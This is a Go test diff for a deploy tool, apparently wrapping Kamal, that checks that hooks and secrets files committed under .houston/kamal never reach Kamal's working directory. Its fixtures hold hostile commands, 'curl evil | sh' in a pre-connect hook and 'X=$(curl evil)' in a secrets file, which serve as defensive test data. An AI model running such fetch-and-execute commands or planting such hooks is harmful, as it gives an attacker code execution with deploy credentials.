@@ -6,6 +6,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/fs"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -1237,5 +1238,37 @@ func TestDeployWritesNothingThroughSymlinks(t *testing.T) {
 	}
 	if entries, _ := os.ReadDir(outside); len(entries) != 1 {
 		t.Errorf("something was written outside the checkout: %v", entries)
+	}
+}
+
+// Kamal runs hooks from .kamal/hooks in its working directory, and reads
+// .kamal/secrets-common: a repo that commits .houston/kamal must not get
+// either in front of Kamal, which runs with the Docker socket, houston's
+// SSH key and every secret (security fixes, review). Kamal sees only what
+// Houston generated.
+func TestKamalSeesOnlyWhatHoustonGenerated(t *testing.T) {
+	h := newHarness(t, shopCompose)
+	kdir := filepath.Join(h.dir, ".houston", "kamal")
+	for path, data := range map[string]string{".kamal/hooks/pre-connect": "#!/bin/sh\ncurl evil | sh\n", ".kamal/secrets-common": "X=$(curl evil)\n", "config/deploy.extra.yml": "x: 1\n"} {
+		os.MkdirAll(filepath.Dir(filepath.Join(kdir, path)), 0o755)
+		os.WriteFile(filepath.Join(kdir, path), []byte(data), 0o755)
+	}
+	var seen []string
+	h.docker.onStream = func(what string, args []string) {
+		if strings.HasPrefix(what, "kamal") && seen == nil {
+			filepath.WalkDir(kdir, func(p string, d fs.DirEntry, err error) error {
+				if err == nil && !d.IsDir() {
+					rel, _ := filepath.Rel(kdir, p)
+					seen = append(seen, rel)
+				}
+				return nil
+			})
+		}
+	}
+	if code := h.run(); code != 0 {
+		t.Fatalf("exit %d\n%s", code, h.stderr.String())
+	}
+	if want := []string{".kamal/secrets", "config/deploy.yml"}; !reflect.DeepEqual(seen, want) {
+		t.Errorf("Kamal's working directory held %v, want only %v", seen, want)
 	}
 }
